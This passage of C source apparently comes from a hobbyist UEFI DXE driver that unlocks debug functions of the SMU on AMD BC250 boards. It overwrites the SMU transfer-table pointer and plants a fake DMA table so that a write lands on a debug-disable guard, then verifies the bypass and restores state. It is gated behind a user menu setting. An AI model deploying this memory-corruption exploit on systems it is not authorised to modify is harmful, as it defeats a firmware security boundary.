      DEBUG ((DEBUG_ERROR, "BC250DXEv3SMUUnlockDxe: fake table did not land (chk[0]=0x%02x chk[0x18]=0x%02x)\n",
              Chk[0], Chk[0x18]));
      return EFI_ABORTED;
    }

    N16 = (UINT16)(Chk[0x1A] | (Chk[0x1B] << 8));
    if (N16 != (UINT16)DeadZoneN) {
      DEBUG ((DEBUG_ERROR, "BC250DXEv3SMUUnlockDxe: fake table count mismatch (read 0x%x, want 0x%x)\n",
              N16, (UINT16)DeadZoneN));
      return EFI_ABORTED;
    }
  }
  DEBUG ((DEBUG_INFO, "BC250DXEv3SMUUnlockDxe: fake table ok\n"));

  //
  // 7. Second pass: re-arm the transfer table at P itself and DMA the zeroed
  //    count DWORD with key 0x37.  The SMU walks past the fake entry of size N
  //    and writes the final data word at P + 0x18 + 4*N + 4 == 0x7B3C, the
  //    debug-disable guard.
  //
  ZeroMem (PageVa, 4U);

  Status = OverwriteTrTablePtr (DeadZoneP);
  if (EFI_ERROR (Status)) {
    return Status;
  }

  Status = TransferEngineDram2Smu (PagePhys, 1U, NEW_ENTRY_KEY);
  if (EFI_ERROR (Status)) {
    return Status;
  }

  //
  // 8. Verify: the gated SMN read must no longer return 0xFD and the SMU must
  //    still respond to the test message.
  //
  ProbeValue = 0U;
  Status = SecSmnRead32 (PROBE_ADDR, &ProbeStatus, &ProbeValue);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "BC250DXEv3SMUUnlockDxe: post-unlock SMN probe failed: %r\n", Status));
    return Status;
  }

  Alive = SmuAlive ();
  DEBUG ((DEBUG_INFO, "BC250DXEv3SMUUnlockDxe: probe status=0x%02x alive=%d\n", ProbeStatus, Alive));

  if ((ProbeStatus == SMU_RETURN_REJECTED_PREREQ) || (!Alive)) {
    DEBUG ((DEBUG_ERROR, "BC250DXEv3SMUUnlockDxe: unlock failed - cold power cycle required\n"));
    return EFI_DEVICE_ERROR;
  }
  DEBUG ((DEBUG_INFO, "BC250DXEv3SMUUnlockDxe: debug functions unlocked\n"));

  //
  // 9. Fix up SMU state: clear the staged zone and the ring slots + counters,
  //    then restore the boot-time transfer-engine pointer values.
  //
  Status = SmuMemSet32 (0x7950U, 0U, 0x4CU / 4U);
  if (EFI_ERROR (Status)) {
    return Status;
  }

  Status = SmuMemSet32 (0x18DF0U, 0U, 0x1F0U / 4U);
  if (EFI_ERROR (Status)) {
    return Status;
  }

  for (Index = 0; Index < ARRAY_SIZE (mFixupTable); Index++) {
    Status = SmuWrite32 (mFixupTable[Index].Address, mFixupTable[Index].Value);
    if (EFI_ERROR (Status)) {
      DEBUG ((DEBUG_ERROR, "BC250DXEv3SMUUnlockDxe: fixup write 0x%05x failed: %r\n",
              mFixupTable[Index].Address, Status));
      return Status;
    }
  }

  DEBUG ((DEBUG_INFO, "BC250DXEv3SMUUnlockDxe: fixup done - SMU unlock complete\n"));
  return EFI_SUCCESS;
}

/**
  Determine whether the SMU unlock option is enabled in the shared
  MeiMeiDXEv3SmuUnlockVar variable.

  The variable is managed by the BC250-DXEv3-Menu-Driver.  When the variable
  is absent the menu driver's defaults (all zeros) apply, so this driver
  treats a missing variable as disabled and fails closed.

  @retval TRUE   The SmuUnlock field of the SMU unlock configuration variable
                 is non-zero.
  @retval FALSE  The variable is absent, malformed, or the field is zero.
**/
STATIC
BOOLEAN
ReadSmuUnlockEnabled (
  VOID
  )
{
  EFI_STATUS          Status;
  UINTN               DataSize;
  SMU_UNLOCK_CONFIG   Config;
  EFI_GUID            ConfigGuid = MEIMEIDXEV3_CONFIG_VAR_GUID;

  DataSize = sizeof (Config);
  ZeroMem (&Config, sizeof (Config));

  Status = gRT->GetVariable (
                  MEIMEIDXEV3_SMU_UNLOCK_VAR_NAME,
                  &ConfigGuid,
                  NULL,
                  &DataSize,
                  &Config
                  );

  if (Status == EFI_NOT_FOUND) {
    DEBUG ((DEBUG_INFO, "BC250DXEv3SMUUnlockDxe: %s not found, SMU unlock disabled\n",
            MEIMEIDXEV3_SMU_UNLOCK_VAR_NAME));
    return FALSE;
  }

  if (Status == EFI_BUFFER_TOO_SMALL) {
    DEBUG ((DEBUG_WARN, "BC250DXEv3SMUUnlockDxe: %s smaller than SMU_UNLOCK_CONFIG, SMU unlock disabled\n",
            MEIMEIDXEV3_SMU_UNLOCK_VAR_NAME));
    return FALSE;
  }

  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_WARN, "BC250DXEv3SMUUnlockDxe: failed to read %s: %r\n",
            MEIMEIDXEV3_SMU_UNLOCK_VAR_NAME, Status));
    return FALSE;
  }

  DEBUG ((DEBUG_INFO, "BC250DXEv3SMUUnlockDxe: SmuUnlock=%u\n", Config.SmuUnlock));
  return (BOOLEAN)(Config.SmuUnlock != 0U);
}

/**
  DXE driver entry point.

  Executes the SMU unlock sequence once at dispatch time, but only when the
  SmuUnlock option is enabled in the shared MeiMeiDXEv3SmuUnlockVar variable.
  The driver is fire-and-forget: failures are logged and the boot path always
  continues.

  @param[in] ImageHandle  Standard UEFI image handle.
  @param[in] SystemTable  Standard UEFI system table pointer.

  @retval EFI_SUCCESS  The driver completed (or declined) its work.
**/
EFI_STATUS
EFIAPI
BC250DXEv3SMUUnlockEntryPoint (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS            Status;
  EFI_PHYSICAL_ADDRESS  PagePhys;
  UINT8                 *PageVa;

  DEBUG ((DEBUG_INFO, "BC250DXEv3SMUUnlockDxe: entry\n"));

  //
  // The unlock is gated by the shared MeiMeiDXEv3SmuUnlockVar variable managed
  // by the BC250-DXEv3-Menu-Driver.  When the SmuUnlock option is disabled or
  // the variable is absent, skip all SMU activity.
  //
  if (!ReadSmuUnlockEnabled ()) {
    DEBUG ((DEBUG_INFO, "BC250DXEv3SMUUnlockDxe: SMU unlock not enabled, skipping\n"));
    return EFI_SUCCESS;
  }

  //
  // Allocate one page below 4GB that the SMU DMA engine can address.  In the
  // DXE phase the CPU runs with an identity mapping (virtual == physical), so
  // the returned physical address can also be used as the virtual address.
  //
  PagePhys = 0xFFFFFFFFU;
  Status = gBS->AllocatePages (
                  AllocateMaxAddress,
                  EfiRuntimeServicesData,
                  EFI_SIZE_TO_PAGES (EFI_PAGE_SIZE),
                  &PagePhys
                  );
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "BC250DXEv3SMUUnlockDxe: staging page allocation failed: %r\n", Status));
    return EFI_SUCCESS;
  }

  PageVa = (UINT8 *)(UINTN)PagePhys;

  DEBUG ((DEBUG_INFO, "BC250DXEv3SMUUnlockDxe: staging page phys=0x%lx\n", (UINT64)PagePhys));

  Status = DoSmuUnlock (PageVa, PagePhys);

  gBS->FreePages (PagePhys, EFI_SIZE_TO_PAGES (EFI_PAGE_SIZE));

  DEBUG ((DEBUG_INFO, "BC250DXEv3SMUUnlockDxe: result=%r\n", Status));

  //
  // Always return success: an unlock failure must never block the boot path.
  //
  return EFI_SUCCESS;
}
